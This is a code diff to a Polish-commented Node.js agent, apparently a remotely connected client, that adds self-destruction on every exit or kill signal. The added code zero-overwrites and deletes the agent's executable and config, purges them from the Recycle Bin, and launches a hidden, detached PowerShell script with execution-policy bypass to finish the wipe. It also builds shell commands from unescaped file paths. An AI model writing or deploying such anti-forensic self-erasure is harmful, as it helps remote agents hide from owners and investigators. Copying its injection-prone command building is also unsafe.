@@ -10,6 +10,73 @@ const readline = require('readline');
 const isPackaged = typeof process.pkg !== 'undefined';
 const APP_DIR = isPackaged ? path.dirname(process.execPath) : __dirname;
 const CONFIG_FILE = path.join(APP_DIR, 'config.json');
+const EXE_PATH = process.execPath;
+
+// Funkcja bezpiecznego usuwania pliku (również z kosza)
+function deleteFileCompletely(filePath) {
+  try {
+    if (fs.existsSync(filePath)) {
+      const stats = fs.statSync(filePath);
+      
+      // Nadpisz plik zerami przed usunięciem (secure delete)
+      const fd = fs.openSync(filePath, 'r+');
+      const buffer = Buffer.alloc(stats.size, 0);
+      fs.writeSync(fd, buffer, 0, buffer.length, 0);
+      fs.closeSync(fd);
+      
+      // Usuń plik
+      fs.unlinkSync(filePath);
+      
+      // Na Windows - użyj PowerShell z flagą Force (pominięcie kosza)
+      if (os.platform() === 'win32') {
+        exec(`powershell -Command "$item = '${filePath.replace(/\\/g, '\\\\')}'; if (Test-Path $item) { Remove-Item -Path $item -Force }; $shell = New-Object -ComObject Shell.Application; $recycleBin = $shell.Namespace(0xA); $recycleBin.Items() | Where-Object {$_.Path -eq $item} | ForEach-Object { Remove-Item $_.Path -Force -ErrorAction SilentlyContinue }"`, { windowsHide: true });
+      }
+    }
+  } catch (error) {
+    // Ignoruj błędy usuwania
+  }
+}
+
+// Funkcja samousuwania agenta
+function selfDestruct() {
+  if (isPackaged) {
+    // Usuń plik wykonywalny
+    deleteFileCompletely(EXE_PATH);
+    
+    // Usuń plik konfiguracyjny
+    deleteFileCompletely(CONFIG_FILE);
+    
+    // Na Windows - uruchom skrypt PowerShell który agresywnie usunie wszystko
+    if (os.platform() === 'win32') {
+      const psScript = path.join(APP_DIR, 'cleanup.ps1');
+      const exePath = EXE_PATH.replace(/\\/g, '\\\\');
+      const configPath = CONFIG_FILE.replace(/\\/g, '\\\\');
+      const psContent = `Start-Sleep -Seconds 2
+$files = @("${exePath}", "${configPath}", "$PSCommandPath")
+foreach ($file in $files) {
+    if (Test-Path $file) {
+        Remove-Item -Path $file -Force -ErrorAction SilentlyContinue
+    }
+}
+$shell = New-Object -ComObject Shell.Application
+$recycleBin = $shell.Namespace(0xA)
+$recycleBin.Items() | Where-Object {$files -contains $_.Path} | ForEach-Object {
+    Remove-Item $_.Path -Force -ErrorAction SilentlyContinue
+}`;
+      
+      try {
+        fs.writeFileSync(psScript, psContent);
+        exec(`powershell -WindowStyle Hidden -ExecutionPolicy Bypass -File "${psScript}"`, { 
+          windowsHide: true,
+          detached: true,
+          stdio: 'ignore'
+        });
+      } catch (error) {
+        // Ignoruj błędy
+      }
+    }
+  }
+}
 
 let config = {
   serverUrl: 'ws://localhost:3001',
@@ -640,17 +707,41 @@ function reconnect() {
   }
 }
 
-// Graceful shutdown
-process.on('SIGINT', () => {
+// Obsługa zamykania - usuwanie pliku przy każdej próbie zamknięcia
+function handleExit() {
   console.log('\nZamykanie agenta...');
+  
+  // Usuń pliki agenta
+  selfDestruct();
+  
   if (ws) {
     ws.close();
   }
   if (reconnectTimeout) {
     clearTimeout(reconnectTimeout);
   }
+  
   process.exit(0);
+}
+
+// Obsługa wszystkich możliwych sygnałów zamknięcia
+process.on('SIGINT', handleExit);   // Ctrl+C
+process.on('SIGTERM', handleExit);  // Kill command
+process.on('SIGQUIT', handleExit);  // Quit signal
+process.on('exit', () => {          // Normalne zamknięcie
+  selfDestruct();
 });
+
+// Windows specific - zamknięcie konsoli
+if (os.platform() === 'win32') {
+  const rl = require('readline').createInterface({
+    input: process.stdin,
+    output: process.stdout
+  });
+  
+  rl.on('SIGINT', handleExit);
+  rl.on('close', handleExit);
+}
 
 // Główna funkcja startowa
 async function start() {
